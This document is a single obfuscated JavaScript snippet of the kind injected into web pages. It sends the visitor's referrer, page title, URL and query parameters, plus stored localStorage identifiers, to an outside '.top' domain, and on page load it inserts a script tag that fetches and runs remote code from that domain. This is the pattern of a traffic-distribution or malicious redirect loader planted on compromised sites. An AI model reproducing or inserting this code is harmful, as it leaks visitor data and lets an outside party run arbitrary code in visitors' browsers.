<script>
    (function() {
    var name = '_Xn2L48cw848gtSJG';
    if (!window._Xn2L48cw848gtSJG) {
        window._Xn2L48cw848gtSJG = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://salonurodyelegante.top/',
        };
    }
    const _JtWMhKwLwk2W95RC = localStorage.getItem('config');
    if (typeof _JtWMhKwLwk2W95RC !== 'undefined' && _JtWMhKwLwk2W95RC !== null) {
        var _JgKZkBDxnCp1hVBN = JSON.parse(_JtWMhKwLwk2W95RC);
        var _ZNkkvpDv33D6CrkG = Math.round(+new Date()/1000);
        if (_JgKZkBDxnCp1hVBN.created_at + window._Xn2L48cw848gtSJG.ttl < _ZNkkvpDv33D6CrkG) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _Vdn1xgGzxcsn9CvP = localStorage.getItem('subId');
    var _GjvSp3kHR3MgTsjN = localStorage.getItem('token');
    var _BGMzh6jCqmQcwDKR = '?return=js.client';
        _BGMzh6jCqmQcwDKR += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _BGMzh6jCqmQcwDKR += '&se_referrer=' + encodeURIComponent(document.referrer);
        _BGMzh6jCqmQcwDKR += '&default_keyword=' + encodeURIComponent(document.title);
        _BGMzh6jCqmQcwDKR += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _BGMzh6jCqmQcwDKR += '&name=' + encodeURIComponent(name);
        _BGMzh6jCqmQcwDKR += '&host=' + encodeURIComponent(window._Xn2L48cw848gtSJG.R_PATH);
    if (typeof _Vdn1xgGzxcsn9CvP !== 'undefined' && _Vdn1xgGzxcsn9CvP && window._Xn2L48cw848gtSJG.unique) {
        _BGMzh6jCqmQcwDKR += '&sub_id=' + encodeURIComponent(_Vdn1xgGzxcsn9CvP);
    }
    if (typeof _GjvSp3kHR3MgTsjN !== 'undefined' && _GjvSp3kHR3MgTsjN && window._Xn2L48cw848gtSJG.unique) {
        _BGMzh6jCqmQcwDKR += '&token=' + encodeURIComponent(_GjvSp3kHR3MgTsjN);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._Xn2L48cw848gtSJG.R_PATH + _BGMzh6jCqmQcwDKR;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>
